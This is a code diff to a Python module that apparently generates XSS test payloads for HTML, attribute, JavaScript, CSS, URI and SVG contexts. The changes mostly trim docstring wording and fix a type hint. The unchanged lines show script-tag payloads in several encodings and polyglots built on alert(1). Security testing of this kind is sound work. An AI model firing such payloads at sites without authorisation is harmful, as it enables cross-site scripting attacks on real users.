@@ -6,11 +6,11 @@
 # Telegram: https://t.me/EasyProTech
 
 """
-Context matrix for comprehensive XSS payload generation
+Context matrix for XSS payload generation
 Supports 6 contexts: HTML, Attribute, JavaScript, CSS, URI, SVG
 """
 
-from typing import Dict, List, Set
+from typing import Dict, List, Set, Optional
 from enum import Enum
 
 
@@ -211,14 +211,14 @@ class ContextMatrix:
             "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
             "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
             
-            # Advanced polyglots
+            # polyglots
             "<!--<script>alert(1)</script>-->",
             "<![CDATA[<script>alert(1)</script>]]>",
             "<?xml version=\"1.0\"?><script>alert(1)</script>",
         ]
     
     def _build_aggr_payloads(self) -> List[str]:
-        """Build aggressive payloads with multi-encoding and advanced techniques"""
+        """Build aggressive payloads with multi-encoding and techniques"""
         base_payloads = [
             "alert(1)",
             "confirm(1)",
@@ -284,14 +284,14 @@ class ContextMatrix:
         """Get all supported contexts"""
         return set(self.context_payloads.keys())
     
-    def get_payload_count(self, context: Context = None) -> int:
+    def get_payload_count(self, context: Optional[Context] = None) -> int:
         """Get payload count for context or total"""
         if context:
             return len(self.context_payloads.get(context, []))
         return sum(len(payloads) for payloads in self.context_payloads.values())
     
     def get_total_payload_count(self) -> Dict[str, int]:
-        """Get comprehensive payload statistics"""
+        """Get payload statistics"""
         return {
             "context_specific": sum(len(p) for p in self.context_payloads.values()),
             "polyglot": len(self.polyglot_payloads),
